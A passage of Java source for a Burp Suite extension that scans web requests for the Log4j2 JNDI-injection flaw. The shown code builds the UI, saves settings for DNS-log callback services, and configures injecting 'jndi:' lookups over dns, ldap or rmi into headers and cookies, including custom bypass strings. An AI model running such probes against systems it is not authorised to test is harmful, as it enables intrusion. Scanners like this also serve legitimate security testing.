package burp;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.*;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.commons.lang3.RandomStringUtils;

public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController {
    private IBurpExtenderCallbacks callbacks;

    private IExtensionHelpers helpers;

    private PrintWriter stdout;

    private JSplitPane mjSplitPane;

    private List<TablesData> Udatas = new ArrayList<>();

    private IMessageEditor HRequestTextEditor;

    private IMessageEditor HResponseTextEditor;

    private IHttpRequestResponse currentlyDisplayedItem;

    private URLTable Utable;

    private JScrollPane UscrollPane;

    private JSplitPane HjSplitPane;

    private JSplitPane ceye_pane;

    private Label Label_lb;

    private Button Button_bt;

    private JSplitPane HjSplitPane2;

    private JPanel mjPane;

    private JTabbedPane Ltable;

    private JTabbedPane Rtable;

    private JTabbedPane Rtable2;

    private JTextArea textArea1;

    private JButton mbutton;

    private JButton mbutton2;

    private JTextArea textArea2;

    private JPanel panel1;

    private JCheckBox isuseceye_box; // 是否使用ceye的dns平台

    private JCheckBox isuseprivatedns_box; // 是否使用自定义dns

    private JCheckBox isip_box; // 自定义dns是否为ip

    private JCheckBox isuseUserAgentTokenXff_CheckBox; //是否使用UA、Token、XFF扫描

    private JCheckBox isuseXfflists_CheckBox; // 是否使用xff lists扫描

    private JCheckBox isuseAllCookie_CheckBox; // 是否全部cookie扫描

    private JCheckBox isuseContenttypeRefererOrigin_CheckBox; // 是否使用Contenttype、refer、origin扫描

    private JCheckBox isuseAccept_CheckBox; // 是否使用Accept参数扫描

    private JTextField fieldd1;  // jndi参数

    private JComboBox fieldd2; // 协议名称dns ldap rmi

    private JTextField field2; // ceye的token

    private JTextField field3; // ceye平台的地址

    private JTextField field22; // 自定义dnslog的地址

    private JTextArea field33; // 自定义dnslog响应查看地址

    private JTextArea whitelists_area;

    private String logxn_dnslog;

    private String logxn_dnslog_token;

    private Boolean logxn ;

    private Boolean burpdns;

    private String burp_dnslog;

    private String dnslogcn ;

    private Boolean privatedns;

    private Boolean isip;

    private Boolean isipincreasing;

    private Boolean ceyeio ;

    private String ceyetoken;

    private String jarPath;

    private String dnsldaprmi;

    private Boolean isuseUserAgentTokenXff; //(是否测试UA头、X-Forward-for头以及X-Client-IP头)

    private Boolean isuseXfflists; // 是否测试xff头参数

    private Boolean isuseAllCookie; //(是否全部cookie都进行测试)

    private Boolean isuseContenttypeRefererOrigin; // 是否测试Content-Type、Referer、Origin 参数

    private Boolean isuseAccept; // 是否测试Accept-Language、Accept、Accept-Encoding 参数

    private String jndiparam; // jndi:   的点，可以自定义jndi:的bypass方式

//    private IBurpCollaboratorClientContext collaboratorContext;

    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        boolean isuseUserAgentTokenXff = true;

        boolean isuseXfflists = false;

        boolean isuseAllCookie = true;

        boolean privatedns = false;

        boolean isip = false;

        boolean isuseContenttypeRefererOrigin = false;

        boolean isuseAccept = false;

        boolean isipincreasing = true;


        String jndiparam = "jndi:";

//        IBurpCollaboratorClientContext collaboratorContext = null ;
        OkHttpClient client = new OkHttpClient();
        String logxn_dnslog = "";
        String logxn_dnslog_token = "";
//        String burppayload = "";
        Boolean logxn = true;
        Boolean ceyeio = false;
        String ceyetoken = "";
        String dnsldaprmi = "dns";
//        Boolean burpdns = true;

        String os = System.getProperty("os.name");
        File f ;

        if (os.toLowerCase().startsWith("win")) {
            f = new File("log4j2burpscanner.properties");
        }else{
            String jarPath = callbacks.getExtensionFilename(); // 获取当前jar的路径
            f = new File(jarPath.substring(0, jarPath.lastIndexOf("/")) + "/" + "log4j2burpscanner.properties");
        }

        if (!f.exists())
        {
            try {
                f.createNewFile();
                try (FileWriter fileWriter = new FileWriter(f)) {
                    fileWriter.append("isuseceye=false");
                    fileWriter.append("\n");
                    fileWriter.append("ceyetoken=xxxxxx");
                    fileWriter.append("\n");
                    fileWriter.append("ceyednslog=xxxx.ceye.io");
                    fileWriter.append("\n");
                    fileWriter.append("isuseprivatedns=false");
                    fileWriter.append("\n");
                    fileWriter.append("privatednslogurl=xxxx.xxx");
                    fileWriter.append("\n");
                    fileWriter.append("privatednsResponseurl=http://xxxx.xxx/?token=a");
                    fileWriter.append("\n");
                    fileWriter.append("jndiparam=jndi:");
                    fileWriter.append("\n");
                    fileWriter.append("dnsldaprmi=dns");
                    fileWriter.append("\n");
                    fileWriter.append("isuseUserAgentTokenXff=1");
                    fileWriter.append("\n");
                    fileWriter.append("isuseXfflists=0");
                    fileWriter.append("\n");
                    fileWriter.append("isuseAllCookie=1");
                    fileWriter.append("\n");
                    fileWriter.append("isContenttypeRefererOrigin=0");
                    fileWriter.append("\n");
                    fileWriter.append("isuseAccept=0");
                    fileWriter.append("\n");
                    fileWriter.flush();
                } catch (IOException e) { e.printStackTrace(); }
            } catch (IOException e) { e.printStackTrace(); }
        }
        // 查询logxn是否可以访问
        try{
            String indexUrl = "https://log.xn--9tr.com/new_gen";
            Request loginReq = new Request.Builder()
                    .url(indexUrl)
                    .get()
                    .build();

            Call call = client.newCall(loginReq);
            try {
                Robot  r   =   new   Robot();
                r.delay(2500);
            } catch (AWTException e) {
                e.printStackTrace();
            }
            Response response = null;
            try {
                response = call.execute();
            } catch (IOException e) {
                e.printStackTrace();
            }
            String respCookie = null;
            try {
                respCookie = response.body().string();
            } catch (IOException e) {
                e.printStackTrace();
            }
            JSONObject jsonObject = JSON.parseObject(String.valueOf(respCookie));

            logxn_dnslog = jsonObject.getString("domain"); // 读取domain，dnslog
            logxn_dnslog = logxn_dnslog.substring(0,logxn_dnslog.length()-1);
            logxn_dnslog_token = jsonObject.getString("token"); // 读取token，dnslog_token
        }catch (Exception e){
            logxn_dnslog = "log.xn--9tr.com can't access，need to configure ceye api";
            logxn_dnslog_token = "log.xn--9tr.com can't access，need to configure ceye api";
            logxn = false;
        }

        // 生成burp自身的dnslog
//        try {
//            collaboratorContext = callbacks.createBurpCollaboratorClientContext();
//            burp_dnslog = collaboratorContext.generatePayload(true);
//        }catch (Exception e){
//            burp_dnslog = "burp dnslog 生成失败";
//            burpdns = false;
//        }
        this.isuseUserAgentTokenXff = isuseUserAgentTokenXff; // 是否测试UA头、X-Forward-for头以及X-Client-IP头
        this.isuseXfflists = isuseXfflists; // 是否用xff列表测试，包含其他标识IP头
        this.isuseAllCookie = isuseAllCookie; // 是否全部cookie都进行测试
        this.logxn_dnslog = logxn_dnslog;
        this.logxn_dnslog_token = logxn_dnslog_token;
        this.logxn = logxn ;
        this.ceyeio = ceyeio ;
        this.isip = isip;
        this.isipincreasing = isipincreasing;
        this.isuseContenttypeRefererOrigin = isuseContenttypeRefererOrigin;
        this.isuseAccept = isuseAccept;

        this.jndiparam = jndiparam;
        this.dnsldaprmi = dnsldaprmi;
        this.privatedns = privatedns;
//        this.burpdns = burpdns ;
        this.ceyetoken = ceyetoken;
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        callbacks.setExtensionName("log4j2burpscanner");
        this.stdout.println("===========================");
        this.stdout.println("[+]   load successful!     ");
        this.stdout.println("[+]   log4j2burpscanner v0.16.7   ");
        this.stdout.println("[+]      code by f0ng      ");
        this.stdout.println("[+]                       ");
        this.stdout.println("===========================");

//        this.stdout.println("burp的dnslog为" + burp_dnslog);

        this.stdout.println("dns address : " + this.logxn_dnslog);
        this.stdout.println("dns token : " + this.logxn_dnslog_token);

        if (this.logxn_dnslog.contains("configure ceye api")){

        }else {
            this.stdout.println("You also can request to    https://log.xn--9tr.com/" + this.logxn_dnslog_token + "    to see dnslog");
        }
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                BurpExtender.this.textArea1 = new JTextArea("");
                BurpExtender.this.mjSplitPane = new JSplitPane(0); //上下
                BurpExtender.this.Utable = new BurpExtender.URLTable(BurpExtender.this);
                BurpExtender.this.UscrollPane = new JScrollPane(BurpExtender.this.Utable);
                BurpExtender.this.HjSplitPane = new JSplitPane();
                BurpExtender.this.HjSplitPane2 = new JSplitPane();

                BurpExtender.this.HjSplitPane.setDividerLocation(550);
                BurpExtender.this.mjSplitPane.setDividerLocation(230);
                BurpExtender.this.Ltable = new JTabbedPane();
                BurpExtender.this.HRequestTextEditor = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                BurpExtender.this.Ltable.addTab("Request", BurpExtender.this.HRequestTextEditor.getComponent());
                BurpExtender.this.Rtable = new JTabbedPane();

                BurpExtender.this.Rtable2 = new JTabbedPane();

                JPanel panel = new JPanel(); // 创建一个dnslog页面，进行配置dnslog
                panel.setAlignmentX(0.0f);
                panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
                panel.setBorder(new EmptyBorder(10, 10, 10, 10));

                JPanel panel2 = new JPanel();
                panel2.setBorder(BorderFactory.createTitledBorder("ceye config")); // ceye的配置
                panel2.setLayout(new BoxLayout(panel2, BoxLayout.X_AXIS));

                JPanel panel22 = new JPanel();
                panel22.setBorder(BorderFactory.createTitledBorder("other dnslog config")); // ceye的配置
                panel22.setLayout(new BoxLayout(panel22, BoxLayout.X_AXIS));

                JPanel panel3 = new JPanel();
                panel3.setLayout(new BoxLayout(panel3, BoxLayout.X_AXIS));

                JButton btn1 = new JButton("Save configuration");
                btn1.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e){
                        JOptionPane.showMessageDialog(null, "Save Success!", "Save", JOptionPane.INFORMATION_MESSAGE);
                        String total = "";
                        if (isuseceye_box.isSelected()){ //写入isuseceye参数
                            total = total + "isuseceye=1\n";
                        }else{
                            total = total + "isuseceye=0\n";
                        }
                        total = total + "ceyetoken=" + field2.getText().trim() + "\n"; // 写入ceye token参数
                        total = total + "ceyednslog=" + field3.getText().trim() + "\n"; // 写入ceye 平台记录的地址

                        if (isuseprivatedns_box.isSelected()){ // 写入isuseprivatedns参数
                            total = total + "isuseprivatedns=1\n";
                        }else{ total = total + "isuseprivatedns=0\n"; }

                        if (isip_box.isSelected()){ // 写入isip参数
                            total = total + "isip=1\n";
                        }else{ total = total + "isip=0\n"; }

                        total = total + "privatednslogurl=" + field22.getText().trim() + "\n"; // 写入自定义dnslog参数
                        total = total + "privatednsResponseurl=" + field33.getText().trim() + "\n"; // 写入自定义dnslog响应查看地址
                        total = total + "jndiparam=" + fieldd1.getText().trim() + "\n"; // 写入jndi:参数
                        total = total + "dnsldaprmi=" + Objects.requireNonNull(fieldd2.getSelectedItem()).toString().trim() + "\n"; // 写入协议名称dns ldap rmi
                        total = total + "whitelists=" + whitelists_area.getText().replace("\n","、").trim() + "\n"; // 写入协议名称dns ldap rmi

                        if (isuseUserAgentTokenXff_CheckBox.isSelected()){ // 写入isuseUserAgentTokenXff参数
                            total = total + "isuseUserAgentTokenXff=1\n";
                        }else{ total = total + "isuseUserAgentTokenXff=0\n"; }

                        if (isuseXfflists_CheckBox.isSelected()){ // 写入isuseXfflists参数
                            total = total + "isuseXfflists=1\n";
                        }else{ total = total + "isuseXfflists=0\n"; }

                        if (isuseAllCookie_CheckBox.isSelected()){ // 写入isuseAllCookie参数
                            total = total + "isuseAllCookie=1\n";
                        }else{ total = total + "isuseAllCookie=0\n"; }

                        if (isuseContenttypeRefererOrigin_CheckBox.isSelected()){ // 写入isuseContenttypeRefererOrigin参数
                            total = total + "isuseContenttypeRefererOrigin=1\n";
                        }else{
                            total = total + "isuseContenttypeRefererOrigin=0\n"; }

                        if (isuseAccept_CheckBox.isSelected()){ // 写入isuseAccept参数
                            total = total + "isuseAccept=1\n";
                        }else{ total = total + "isuseAccept=0\n"; }

                        try (FileWriter fileWriter = new FileWriter(f.getAbsolutePath())) {
                            fileWriter.append(total);
                        } catch (IOException ee) {
                            ee.printStackTrace();
                        }

                    }
                });

                JButton btn2 = new JButton("Restore/Loading latest params");
                btn2.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e){
                        BurpExtender.this.isuseceye_box.setSelected(false);
                        BurpExtender.this.isuseprivatedns_box.setSelected(false);
                        BurpExtender.this.isip_box.setSelected(false);
                        BurpExtender.this.isuseUserAgentTokenXff_CheckBox.setSelected(true);
                        BurpExtender.this.isuseXfflists_CheckBox.setSelected(false);
                        BurpExtender.this.isuseAllCookie_CheckBox.setSelected(true);
                        BurpExtender.this.isuseContenttypeRefererOrigin_CheckBox.setSelected(false);
                        BurpExtender.this.isuseAccept_CheckBox.setSelected(false);

                        fieldd1.setText("jndi:");
                        fieldd2.setSelectedIndex(0);
                        field2.setText("xxxxxxxxxx");
                        field3.setText("xxxxx.ceye.io");
                        field22.setText("http://x.x.x.x");
                        field33.setLineWrap(true);
                        field33.setText("http://x.x.x.x/repoonsetoken=[token]");
                        whitelists_area.setText("*.gov.cn\n*.edu.cn");
                    }
                });

                JLabel label1 = new JLabel("isuseceye:");
                BurpExtender.this.isuseceye_box = new JCheckBox(); // 是否使用ceye

                JLabel label2 = new JLabel("ceyetoken:");
                BurpExtender.this.field2 = new JTextField(); // ceye的token

                JLabel label3 = new JLabel("ceyednslog:");
                BurpExtender.this.field3 = new JTextField(); // ceye平台的地址


                JLabel label11 = new JLabel("isuseprivatedns:");
                BurpExtender.this.isuseprivatedns_box = new JCheckBox(); // 是否使用自定义dnslog

                isuseceye_box.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e){
                        isuseprivatedns_box.setSelected(false);
                    }
                });

                isuseprivatedns_box.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e){
                        isuseceye_box.setSelected(false);
                    }
                });

                JLabel label111 = new JLabel("isip:");
                BurpExtender.this.isip_box = new JCheckBox(); // 是否使用自定义dnslog

                JLabel label22 = new JLabel("privatednslogurl:");
                BurpExtender.this.field22 = new JTextField(); // 自定义dnslog的地址

                JLabel label33 = new JLabel("privatednsResponseurl:");
                BurpExtender.this.field33 = new JTextArea(); // 自定义dnslog响应查看地址

//                JLabel label44 = new JLabel("privatednsResponseheader:");
//                JTextField privatednsResponseheader_field = new JTextField(16); // 自定义dnslog响应请求头

                GroupLayout layout = new GroupLayout(panel2);
                panel2.setLayout(layout);
                layout.setAutoCreateGaps(true);
                layout.setAutoCreateContainerGaps(true);
                layout.setHorizontalGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                                .addComponent(label1)
                                .addComponent(label2)
                                .addComponent(label3))

                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                                .addComponent(BurpExtender.this.isuseceye_box)
                                .addComponent(BurpExtender.this.field2)
                                .addComponent(BurpExtender.this.field3))
                );

                layout.setVerticalGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(label1)
                                .addComponent(BurpExtender.this.isuseceye_box))

                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(label2)
                                .addComponent(BurpExtender.this.field2))

                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(label3)
                                .addComponent(BurpExtender.this.field3))
                );



                GroupLayout layout2 = new GroupLayout(panel22);
                panel22.setLayout(layout2);
                layout2.setAutoCreateGaps(true);
                layout2.setAutoCreateContainerGaps(true);
                layout2.setHorizontalGroup(layout2.createSequentialGroup()
                        .addGroup(layout2.createParallelGroup(GroupLayout.Alignment.TRAILING)
                                .addComponent(label11)
                                .addComponent(label111)
                                .addComponent(label22)
                                .addComponent(label33))

                        .addGroup(layout2.createParallelGroup(GroupLayout.Alignment.LEADING)
                                .addComponent(BurpExtender.this.isuseprivatedns_box)
                                .addComponent(BurpExtender.this.isip_box)
                                .addComponent(BurpExtender.this.field22)
                                .addComponent(BurpExtender.this.field33))
                );

                layout2.setVerticalGroup(layout2.createSequentialGroup()
                        .addGroup(layout2.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(label11)
                                .addComponent(BurpExtender.this.isuseprivatedns_box))

                        .addGroup(layout2.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(label111)
                                .addComponent(BurpExtender.this.isip_box))

                        .addGroup(layout2.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(label22)
                                .addComponent(BurpExtender.this.field22))

                        .addGroup(layout2.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(label33)
                                .addComponent(BurpExtender.this.field33))
                );

                panel.add(panel2);
                panel.add(panel22);

                panel3.add(btn1);
                panel3.add(btn2);
                panel.add(panel3);

                BurpExtender.this.Rtable2.addTab("dnslog configuration",panel); //将dnslog 配置添加到JTabbedPane

                JPanel panell = new JPanel(); // 创建一个可自定义参数页面，进行配置自定义参数扫描
                panell.setAlignmentX(0.0f);
                panell.setLayout(new BoxLayout(panell, BoxLayout.Y_AXIS));
                panell.setBorder(new EmptyBorder(10, 10, 10, 10));


                JPanel panell2 = new JPanel();// 自定义参数 可视化的模块
                panell2.setBorder(BorderFactory.createTitledBorder("custom params(including bypass)")); // 自定义参数
                panell2.setLayout(new BoxLayout(panel2, BoxLayout.X_AXIS));

                JPanel panell3 = new JPanel(); // 按钮模块
                panel3.setLayout(new BoxLayout(panel3, BoxLayout.X_AXIS));

                JLabel labell1 = new JLabel("jndiparam:");
                BurpExtender.this.fieldd1 = new JTextField(); // jndi参数

                JLabel labell2 = new JLabel("dnsldaprmi:");
                String[] sg = { "dns", "ldap", "rmi" };
                BurpExtender.this.fieldd2 = new JComboBox(sg); // 协议名称dns ldap rmi

                JLabel labell3 = new JLabel("white lists:");
                BurpExtender.this.whitelists_area = new JTextArea(3,20);

                BurpExtender.this.whitelists_area.setLineWrap(true);

                JPanel panelOutput = new JPanel();
                panelOutput.setSize(50,50);
                panelOutput.add(new JScrollPane(BurpExtender.this.whitelists_area));
                /**
                 * isuseUserAgentTokenXff=1
                 * isuseXfflists=0
                 * isuseAllCookie=1
                 * isuseContenttypeRefererOrigin=0
                 * isuseAccept=0
                 */

                JLabel isuseUserAgentTokenXff_label = new JLabel("test UserAgentTokenXff");
                BurpExtender.this.isuseUserAgentTokenXff_CheckBox = new JCheckBox();

                JLabel isuseXfflists_label = new JLabel("test Xfflists:");
                BurpExtender.this.isuseXfflists_CheckBox = new JCheckBox();

                JLabel isuseAllCookie_label = new JLabel("test AllCookie:");
                BurpExtender.this.isuseAllCookie_CheckBox = new JCheckBox();

                JLabel isuseContenttypeRefererOrigin_label = new JLabel("test ContenttypeRefererOrigin:");
                BurpExtender.this.isuseContenttypeRefererOrigin_CheckBox = new JCheckBox();

                JLabel isuseAccept_label = new JLabel("test Accept:");
                BurpExtender.this.isuseAccept_CheckBox = new JCheckBox();

                GroupLayout layoutt1 = new GroupLayout(panell2);
                panell2.setLayout(layoutt1);
                layoutt1.setAutoCreateGaps(true);
                layoutt1.setAutoCreateContainerGaps(true);
                layoutt1.setHorizontalGroup(layoutt1.createSequentialGroup()
                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.TRAILING)
                                .addComponent(labell1)
                                .addComponent(labell2)
                                .addComponent(labell3)
                                .addComponent(isuseUserAgentTokenXff_label)
                                .addComponent(isuseXfflists_label)
                                .addComponent(isuseAllCookie_label)
                                .addComponent(isuseContenttypeRefererOrigin_label)
                                .addComponent(isuseAccept_label))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.LEADING)
                                .addComponent(BurpExtender.this.fieldd1)
                                .addComponent(BurpExtender.this.fieldd2)
                                .addComponent(panelOutput)
                                .addComponent(BurpExtender.this.isuseUserAgentTokenXff_CheckBox)
                                .addComponent(BurpExtender.this.isuseXfflists_CheckBox)
                                .addComponent(BurpExtender.this.isuseAllCookie_CheckBox)
                                .addComponent(BurpExtender.this.isuseContenttypeRefererOrigin_CheckBox)
                                .addComponent(BurpExtender.this.isuseAccept_CheckBox))
                );

                layoutt1.setVerticalGroup(layoutt1.createSequentialGroup()
                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(labell1)
                                .addComponent(BurpExtender.this.fieldd1))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(labell2)
                                .addComponent(BurpExtender.this.fieldd2))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(labell3)
                                .addComponent(panelOutput))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(isuseUserAgentTokenXff_label)
                                .addComponent(BurpExtender.this.isuseUserAgentTokenXff_CheckBox))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(isuseXfflists_label)
                                .addComponent(BurpExtender.this.isuseXfflists_CheckBox))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(isuseAllCookie_label)
                                .addComponent(BurpExtender.this.isuseAllCookie_CheckBox))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(isuseContenttypeRefererOrigin_label)
                                .addComponent(BurpExtender.this.isuseContenttypeRefererOrigin_CheckBox))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(isuseAccept_label)
                                .addComponent(BurpExtender.this.isuseAccept_CheckBox))
                );


                JButton btn_1 = new JButton("Save configuration");
                btn_1.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e) {
                        JOptionPane.showMessageDialog(null, "Save Success!", "Save", JOptionPane.INFORMATION_MESSAGE);
                        String total = "";
                        if (isuseceye_box.isSelected()){ //写入isuseceye参数
                            total = total + "isuseceye=1\n";
                        }else{
                            total = total + "isuseceye=0\n";
                        }
                        total = total + "ceyetoken=" + field2.getText().trim() + "\n"; // 写入ceye token参数
                        total = total + "ceyednslog=" + field3.getText().trim() + "\n"; // 写入ceye 平台记录的地址

                        if (isuseprivatedns_box.isSelected()){ // 写入isuseprivatedns参数
                            total = total + "isuseprivatedns=1\n";
                        }else{ total = total + "isuseprivatedns=0\n"; }

                        if (isip_box.isSelected()){ // 写入isip参数
                            total = total + "isip=1\n";
                        }else{ total = total + "isip=0\n"; }

                        total = total + "privatednslogurl=" + field22.getText().trim() + "\n"; // 写入自定义dnslog参数
                        total = total + "privatednsResponseurl=" + field33.getText().trim() + "\n"; // 写入自定义dnslog响应查看地址
                        total = total + "jndiparam=" + fieldd1.getText().trim() + "\n"; // 写入jndi:参数
                        total = total + "dnsldaprmi=" + fieldd2.getSelectedItem().toString().trim() + "\n"; // 写入协议名称dns ldap rmi
                        total = total + "whitelists=" + whitelists_area.getText().replace("\n","、").trim() + "\n"; // 写入协议名称dns ldap rmi

                        if (isuseUserAgentTokenXff_CheckBox.isSelected()){ // 写入isuseUserAgentTokenXff参数
                            total = total + "isuseUserAgentTokenXff=1\n";
                        }else{ total = total + "isuseUserAgentTokenXff=0\n"; }

                        if (isuseXfflists_CheckBox.isSelected()){ // 写入isip参数
                            total = total + "isuseXfflists=1\n";
                        }else{ total = total + "isuseXfflists=0\n"; }

                        if (isuseAllCookie_CheckBox.isSelected()){ // 写入isuseprivatedns参数
                            total = total + "isuseAllCookie=1\n";
                        }else{ total = total + "isuseAllCookie=0\n"; }

                        if (isuseContenttypeRefererOrigin_CheckBox.isSelected()){ // 写入isip参数
                            total = total + "isuseContenttypeRefererOrigin=1\n";
                        }else{
                            total = total + "isuseContenttypeRefererOrigin=0\n"; }

                        if (isuseAccept_CheckBox.isSelected()){ // 写入isip参数
                            total = total + "isuseAccept=1\n";
                        }else{ total = total + "isuseAccept=0\n"; }

                        try (FileWriter fileWriter = new FileWriter(f.getAbsolutePath())) {
                            fileWriter.append(total);
                        } catch (IOException ee) {
                            ee.printStackTrace();
                        }
                    }
                });

                JButton btn_2 = new JButton("Restore/Loading latest params");
                btn_2.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e){
                        BurpExtender.this.isuseceye_box.setSelected(false);
                        BurpExtender.this.isuseprivatedns_box.setSelected(false);
                        BurpExtender.this.isip_box.setSelected(false);
                        BurpExtender.this.isuseUserAgentTokenXff_CheckBox.setSelected(true);
                        BurpExtender.this.isuseXfflists_CheckBox.setSelected(false);
                        BurpExtender.this.isuseAllCookie_CheckBox.setSelected(true);
                        BurpExtender.this.isuseContenttypeRefererOrigin_CheckBox.setSelected(false);
                        BurpExtender.this.isuseAccept_CheckBox.setSelected(false);

                        fieldd1.setText("jndi:");
                        fieldd2.setSelectedIndex(0);
                        field2.setText("xxxxxxxxxx");
                        field3.setText("xxxxx.ceye.io");
                        field22.setText("http://x.x.x.x");
                        field33.setLineWrap(true);
                        field33.setText("http://x.x.x.x/repoonsetoken=[token]");
                        whitelists_area.setText("*.gov.cn\n*.edu.cn");
                    }
                });


                panell3.add(btn_1);
                panell3.add(btn_2);
                panell.add(panell2);
                panell.add(panell3);

                BurpExtender.this.Rtable2.addTab("custom params",panell); //将自定义参数页面添加到JTabbedPane

                BurpExtender.this.HResponseTextEditor = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                BurpExtender.this.Rtable.addTab("Response", BurpExtender.this.HResponseTextEditor.getComponent());
                BurpExtender.this.Rtable.addTab("Config", BurpExtender.this.Rtable2);


                BufferedReader reader = null;
                StringBuffer sbf = new StringBuffer();
                String output = "";
                try {
                    reader = new BufferedReader(new FileReader(f));
                    String tempStr;
                    while ((tempStr = reader.readLine()) != null) {
                        sbf.append(tempStr + '\n');
                    }
                    reader.close();
                    output =  sbf.toString();
                } catch (IOException e) {}
                BurpExtender.this.textArea1.setText(output);

                // 设置默认属性
                if (FileGetValue(f,"isuseceye").equals("1"))
                    BurpExtender.this.isuseceye_box.setSelected(true); // 是否使用ceye的dns平台
                else
                    BurpExtender.this.isuseceye_box.setSelected(false);

                if (FileGetValue(f,"isuseprivatedns").equals("1")) // 是否使用自定义dns
                    BurpExtender.this.isuseprivatedns_box.setSelected(true);
                else
                    BurpExtender.this.isuseprivatedns_box.setSelected(false);

                if (FileGetValue(f,"isip").equals("1")) // 自定义dns是否为ip
                    BurpExtender.this.isip_box.setSelected(true);
                else
                    BurpExtender.this.isip_box.setSelected(false);

                if (FileGetValue(f,"isuseUserAgentTokenXff").equals("1")) // 是否使用UA、Token、XFF扫描
                    BurpExtender.this.isuseUserAgentTokenXff_CheckBox.setSelected(true);
                else
                    BurpExtender.this.isuseUserAgentTokenXff_CheckBox.setSelected(false);

                if (FileGetValue(f,"isuseXfflists").equals("1")) // 是否使用xff lists扫描
                    BurpExtender.this.isuseXfflists_CheckBox.setSelected(true);
                else
                    BurpExtender.this.isuseXfflists_CheckBox.setSelected(false);

                if (FileGetValue(f,"isuseAllCookie").equals("1")) // 是否全部cookie扫描
                    BurpExtender.this.isuseAllCookie_CheckBox.setSelected(true);
                else
                    BurpExtender.this.isuseAllCookie_CheckBox.setSelected(false);

                if (FileGetValue(f,"isuseContenttypeRefererOrigin").equals("1")) // 是否使用Contenttype、refer、origin扫描
                    BurpExtender.this.isuseContenttypeRefererOrigin_CheckBox.setSelected(true);
                else
                    BurpExtender.this.isuseContenttypeRefererOrigin_CheckBox.setSelected(false);

                if (FileGetValue(f,"isuseAccept").equals("1")) // 是否使用Accept参数扫描
                    BurpExtender.this.isuseAccept_CheckBox.setSelected(true);
                else
                    BurpExtender.this.isuseAccept_CheckBox.setSelected(false);

                String jndi_param = FileGetValue(f, "jndiparam"); // jndi参数
                fieldd1.setText(jndi_param);

                String dnsldaprmi_param = FileGetValue(f, "dnsldaprmi"); // dnsldaprmi 参数
                if (dnsldaprmi_param.equals("dns"))
                    fieldd2.setSelectedIndex(0);
                if (dnsldaprmi_param.equals("ldap"))
                    fieldd2.setSelectedIndex(1);
                if (dnsldaprmi_param.equals("rmi"))
                    fieldd2.setSelectedIndex(2);

                String ceyetoken_param = FileGetValue(f, "ceyetoken"); // ceye的token 参数
                field2.setText(ceyetoken_param);

                String ceyednslog_param = FileGetValue(f, "ceyednslog"); // ceye的地址 参数
                field3.setText(ceyednslog_param);

                String privatednslogurl_param = FileGetValue(f, "privatednslogurl"); // 自定义dnslog 参数
                field22.setText(privatednslogurl_param);

                String privatednsResponseurl_param = FileGetValue(f, "privatednsResponseurl"); // dnsldaprmi 参数
                field33.setLineWrap(true);
                field33.setText(privatednsResponseurl_param);

                String white_lists_param = FileGetValue(f,"whitelists");
                whitelists_area.setText(white_lists_param.replace("、","\n"));

                BurpExtender.this.HjSplitPane.add(BurpExtender.this.Ltable, "left"); // request窗体
                BurpExtender.this.HjSplitPane.add(BurpExtender.this.Rtable, "right"); // response窗体
                BurpExtender.this.mjSplitPane.add(BurpExtender.this.UscrollPane, "left"); // 结果集
                BurpExtender.this.mjSplitPane.add(BurpExtender.this.HjSplitPane, "right"); // request response一起

                BurpExtender.this.callbacks.customizeUiComponent(BurpExtender.this.mjSplitPane);
                BurpExtender.this.callbacks.addSuiteTab(BurpExtender.this);
            }
        });
        callbacks.registerScannerCheck(this);
    }

    public String vulnurl_param (String vulnurl, int i ,Boolean needincreasing){
        String vulnurl_total = "";
        if (needincreasing) {
            String[] vulnurls = vulnurl.split("://", 2);
